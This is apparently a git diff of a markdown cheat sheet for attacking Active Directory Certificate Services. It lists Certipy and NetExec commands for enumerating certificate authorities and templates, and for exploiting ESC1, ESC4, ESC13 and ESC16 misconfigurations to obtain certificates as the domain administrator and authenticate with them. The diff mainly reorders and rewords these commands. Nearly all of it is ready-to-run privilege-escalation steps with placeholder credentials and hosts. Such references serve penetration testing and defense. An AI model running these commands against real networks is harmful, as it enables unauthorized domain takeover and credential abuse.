@@ -12,6 +12,7 @@
 
 # Installation
 https://github.com/ly4k/Certipy/wiki/04-%E2%80%90-Installation
+
 **Using pip**
 ```
 sudo apt update && sudo apt install -y python3 python3-pip
@@ -28,13 +29,17 @@ pipx install -f "git+https://github.com/ly4k/Certipy.git"
 uv tool install git+https://github.com/ly4k/Certipy --force
 ```
 # Enumeration
-Find PKI Enrollment Services in Active Directory and Certificate Templates Names
-```
-nxc ldap ip -u username -p password -M adcs
-```
 Search for vulnerable certificate templates
 ```
 certipy find -u username -p password -dc-ip ip -target dc -enabled -vulnerable -stdout
+```
+Find PKI Enrollment Services in Active Directory and Certificate Templates Names
+```
+nxc ldap target -u username -p password -M adcs
+```
+Anonymously uses RPC endpoints to hunt for ADCS CAs
+```
+nxc smb target -M enum_ca
 ```
 # Attacks
 ## ESC1
@@ -48,7 +53,7 @@ Or
 ```
 certipy req -u username -p password -ca ca -target domain -template template -upn administrator -dc-ip ip
 ```
-> Sometimes if you run certipy and see `Minimum RSA Key Length              : 4096`, you need to provide `-key-size 4096`
+> If you run certipy and see `Minimum RSA Key Length : 4096`, you may need to provide the `-key-size 4096` option
 ```bash
 certipy req -u username -p password -ca ca -target domain -template template -upn administrator -dc-ip ip -key-size 4096
 ```
@@ -60,7 +65,7 @@ New update:
 
 https://support.microsoft.com/en-us/topic/kb5014754-certificate-based-authentication-changes-on-windows-domain-controllers-ad2c23b0-15d8-4340-a468-4d4f3b188f16
 
-Fix: add the sid
+Fix: provide the `-sid` flag for the targeted user
 ```
 certipy req -u username -p password -ca ca -target domain -template template -upn administrator -sid <administrator sid> -dc-ip ip 
 ```
@@ -75,6 +80,7 @@ certipy req username -p password -ca ca -target domain -template User -on-behalf
 certipy auth -pfx administrator.pfx -dc-ip ip
 ```
 ## ESC4
+#### Certipy 4.8.2
 ```
 certipy template -u username -p password -template template -save-old -dc-ip ip
 ```
@@ -84,7 +90,7 @@ certipy req -u username -p password -dc-ip ip -ca ca -target dc -template templa
 ```
 certipy auth -pfx administrator.pfx -domain domain -u administrator -dc-ip ip
 ```
-#### Exploit - Certipy 5.0.2
+#### Certipy 5.0.2
 The commands for certipy version 5.0.2 are different
 ```
 certipy template -u username@domain -p password -template template -write-default-configuration -no-save
@@ -142,7 +148,7 @@ certipy auth -pfx administrator.pfx -domain domain
 ```
 ## ESC13
 ```
-certipy req -u username -p password -ca ca -target domain -template template -dc-ip ip -key-size 4096
+certipy req -u username -p password -ca ca -target domain -template template -dc-ip ip
 ```
 ```
 certipy auth -pfx file.pfx -dc-ip ip
@@ -189,18 +195,17 @@ certipy auth -pfx administrator.pfx -dc-ip ip
 ## ESC16
 We use a user that has GenericAll or GenericWrite
 ```
-certipy account -u username@domain -p password -dc-ip ip -upn administrator -user owned_user update
+certipy account -u owned_user@domain -p password -dc-ip ip -upn administrator -user username update
 ```
 ```
-certipy req -u owned_user@domain -p password -dc-ip ip -target dc -ca ca -template User -upn administrator@domain -sid <administrator sid>
+certipy req -u username@domain -p password -dc-ip ip -target dc -ca ca -template User -upn administrator@domain -sid <administrator sid>
 ```
 ```
-certipy account -u username@domain -p password -dc-ip ip -upn owned_user -user owned_user update
+certipy account -u owned_user@domain -p password -dc-ip ip -upn username -user username update
 ```
 ```
 certipy auth -pfx administrator.pfx -dc-ip ip -domain domain
 ```
-
 # Resources
 - https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation
 - https://harmj0y.medium.com/certified-pre-owned-a22285fc0a3f
